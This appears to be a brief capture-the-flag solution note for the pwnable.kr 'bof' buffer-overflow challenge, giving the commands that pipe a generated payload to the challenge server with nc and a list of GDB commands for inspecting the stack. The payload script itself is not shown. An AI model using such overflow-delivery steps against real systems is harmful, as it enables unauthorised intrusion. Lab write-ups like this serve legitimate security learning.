# `bof` Solution

Here it is crucial to do the `stdin` redirection right (pipe is closed using other methods, TO-DO: needs more research):

    python splt.py > payload.bin
    cat payload.bin - | nc pwnable.kr 9000

# GDB Notes

    checksec
    disassemble key
    disassemble func
    run < <(python splt.py)
    file
    info file
    break func
    run < <(python splt.py)
    until *0x56555654
    print/x [ebp + 8]
    print/x [$ebp + 8]
    stack
    hexdump $sp
    hexdump $sp+8
    hexdump $ebp+8
